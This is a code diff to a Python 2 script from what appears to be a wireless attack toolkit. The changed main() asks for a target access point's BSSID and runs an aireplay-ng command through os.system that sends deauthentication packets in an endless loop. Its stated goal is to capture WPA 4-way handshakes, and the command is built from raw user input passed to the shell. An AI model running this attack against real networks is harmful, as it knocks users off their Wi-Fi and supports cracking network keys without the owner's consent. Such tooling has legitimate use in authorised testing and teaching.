@@ -38,27 +38,25 @@ import sys
 
 os.system('cat /root/Cylon-Raider/banner_aireplay.txt')
 
-class aireplay_Parameters(object):
-
-    def __init__(self, capture_BSSID, amount_Deauth_Packets):
-        self.capture_BSSID = capture_BSSID
-        self.amount_Deauth_Packets = amount_Deauth_Packets
-
-    @classmethod
-    def from_input(cls):
-        return cls(
-            str(raw_input("Enter your target BSSID: ")),
-            str(raw_input("How many deauthorization packets do you want to send?: "))
-        )
+# class aireplay_Parameters(object):
+#
+#     def __init__(self, capture_BSSID, amount_Deauth_Packets):
+#         self.capture_BSSID = capture_BSSID
+#         self.amount_Deauth_Packets = amount_Deauth_Packets
+#
+#     @classmethod
+#     def from_input(cls):
+#         return cls(
+#             str(raw_input("Enter your target BSSID: ")),
+#             str(raw_input("How many deauthorization packets do you want to send?: "))
+#         )
 def main():
-    print 'Answer the following 2 questions to start the de-auth attack and capture the 4-way handshake for WPA routers'
-    user_input = aireplay_Parameters.from_input()
+    # user_input = aireplay_Parameters.from_input()
 
-    cmd_String = "aireplay-ng --deauth {0} -a {1} --ignore-negative-one wlan1mon".format(
-        user_input.amount_Deauth_Packets,
-        user_input.capture_BSSID
-            )
-    print 'Sending %s deauth packets to %s' % (user_input.amount_Deauth_Packets, user_input.capture_BSSID)
+    BSSID_capture = str(raw_input("Enter the BSSID of the ACCESS POINT that you want to deauth: "))
+
+    cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one wlan1mon".format(BSSID_capture)
+    print 'Starting deauth attack loop'
     print cmd_String
     os.system(cmd_String)
     print 'Deauth packets complete, please check your terminal session containing Airodump, see that you captured the key on the top right corner'
